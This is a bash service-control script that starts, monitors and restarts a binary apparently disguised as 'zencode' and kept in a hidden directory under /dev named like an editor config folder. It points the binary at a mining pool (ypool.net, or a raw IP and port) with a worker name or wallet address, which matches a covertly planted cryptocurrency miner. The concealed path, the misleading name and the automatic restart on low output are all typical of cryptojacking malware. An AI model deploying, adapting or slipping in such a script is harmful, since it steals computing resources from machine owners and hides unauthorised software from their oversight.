#!/bin/bash
do_stop() {
    killall -9 zencode-128
    killall -9 zencode-129
    #rm /dev/.vimconf/zencode/log
}

do_start() {
    if [ ! -n "`ps -A | grep -v grep | grep zencode`" ] 
    then
        unbuffer ${BIN} ${ARG} -p x -t 6 1>/dev/.vimconf/zencode/log 2>&1 &
        echo "unbuffer ${BIN} ${ARG} -p x -t 6 1>/dev/.vimconf/zencode/log 2>&1 &"
        exit 0;
    fi
    if [ `wc -l /dev/.vimconf/zencode/log | awk '{print $1}'` -lt 20 ]
    then
       exit 0;
    fi
    if [ `tail -10 /dev/.vimconf/zencode/log | awk -F":" '{c+=int($2);}END{print c/NR}'` -lt 30 ]
    then
        do_stop;
        unbuffer ${BIN} ${ARG} -p x -t 6 1>/dev/.vimconf/zencode/log 2>&1 &
        echo "stop && unbuffer ${BIN} ${ARG} -p x -t 6 1>/dev/.vimconf/zencode/log 2>&1 &"
    fi
    exit 0;
}

BIN="/dev/.vimconf/zencode/zencode-128"
ARG="-o http://ypool.net -u seraphimhj.PTS_1"
type="$2"
source="$3"

if [ ${type} == "new" ]
then
    BIN="/dev/.vimconf/zencode/zencode-129"
fi

if [ ${source} == "pt" ]
then
    ARG="-o 112.124.13.238:28988 -u PouEdYy3tmrLQ9PUvnNRxJgJzTTijncnEa"
fi

case "$1" in
 start)
 echo -n "Starting "
 do_start
 echo "."
 ;;
 stop)
 echo -n "Stopping "
 do_stop
 echo "."
 ;;
 restart)
 echo -n "Restarting "
 do_stop
 do_start
 echo "."
 ;;
 *)
 echo "Usage: $SCRIPTNAME {start|stop|restart}" >&2
 exit 3
 ;;
esac

exit 0
